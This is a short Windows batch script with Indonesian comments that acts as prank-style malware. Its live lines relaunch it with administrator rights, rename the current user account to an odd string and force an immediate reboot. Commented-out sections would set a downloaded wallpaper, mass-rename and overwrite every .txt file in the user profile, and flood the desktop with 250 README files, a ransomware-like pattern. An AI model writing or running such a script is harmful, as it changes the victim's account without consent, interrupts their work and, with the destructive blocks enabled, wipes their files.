:: cek admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

::rename user local
set currentUser=%USERNAME%
wmic useraccount where name='%currentUser%' rename !c^f_i^H3R!


::Download gambar - reboot - set wallpaper ###
::@echo off
::curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"
::set img=%USERPROFILE%\Music\GD_001.jpg
::reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1

:: rename *.txt menjadi ALLUSER
::setlocal enabledelayedexpansion
::set count=1
::for /r "%USERPROFILE%" %%f in (*.txt) do (
::    ren "%%f" "ALLUSER_!count!.txt"
::    set /a count+=1
::)

::ubah isi *.txt - hello word
::for /r "%USERPROFILE%" %%f in (*.txt) do (
::    echo hello word > "%%f"
::)

::create readme.desktop
::setlocal enabledelayedexpansion
::for /l %%i in (1,1,250) do (
::    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
::)

::restart
shutdown /r /t 0
